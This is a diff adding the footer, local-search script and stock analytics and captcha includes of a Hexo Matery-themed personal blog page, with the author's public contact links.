+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">unr4v31</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/unrav31" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:wzhmmmmm@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=792552060" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 792552060" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
